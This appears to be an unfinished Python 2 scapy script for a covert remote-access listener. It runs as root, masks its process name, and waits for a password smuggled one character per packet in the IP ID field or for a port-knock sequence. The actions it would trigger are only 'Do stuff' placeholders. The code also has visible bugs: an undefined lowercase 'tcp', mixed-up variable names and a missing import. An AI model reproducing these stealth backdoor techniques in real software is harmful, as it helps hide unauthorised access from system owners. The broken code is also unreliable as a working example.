from config import *
import os
from scapy.all import *

def main():
	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	# Making sure we have at least 1 password or knock.
	# We need either a password or a knock in order for remote access to work
	if len(password) < 1 and len(knock) < 1:
		print "Check Config: Program must have at least 1 password or knock sequence"
		return
	else:
		# Masking the process name
		if len(mask) > 1:
			setproctitle.setproctitle(mask)

		try:
			# Setting up the packet filter to limit scanned packets
			# The stricter the filter, the fewer packets to process and therefore the better the performance
			packetFilter = "tcp"
			if len(sources) > 0:
				first = True
				for source in sources:
					if first:
						packetFilter = packetFilter + " (ip src " + source
						first = False
					else:
						packetFilter = packetFilter + " or ip src " + source
				packetFilter = packetFilter + ")"

			# Beginning Packet sniffing
			sniff(filter=packetFilter, prn=server())
		except KeyboardInterrupt:
			print "Shutting Down"

def server():
	def getResponse(packet):
		# Check for the reset port first
		for port in reset:
			if port == packet[tcp].sport:
				for src, word in passCheck:
					if src == packet[IP].src:
						passCheck.remove([src, word])
						return
				return

		# Append our password and knock arrays with the next value for each and, when apropriate,
		# check if they are valid passphrases/knock sequences.
		if len(passwords) > 0:
			if checkPassword(packet[IP].src, packet[IP].id):
				if len(knock) > 0:
					if checkKnock(packet[IP].src, packet[TCP].sport):
						print "Do stuff"
				else:
					print "Do stuff"
		if len(knock) > 0:
			if checkKnock(packet[IP].src, packet[TCP].sport):
				print "Do stuff"

	return getResponse

passCheck = []
def checkPassword(ip, ipid):
	found = False
	c = chr(ipid & 0x00FF)
	for i in range(0, len(passCheck)):
		if passCheck[i][0] == ip:
			passCheck[i][1] += c
			#Password check should go here
			found = True
			break
	if found == False:
		passCheck.append([ip, str(c)])
	return False

knockCheck = []
def checkKnock(ip, port):
	found = False
	for i in range(0, len(knockCheck)):
		if knockCheck[i][0] == ip:
			knockCheck[i][1].append(port)
			#knock check should go here
			found = True
			break
	if found == False:
		knockCheck.append([ip, [port]])
	return False

main()

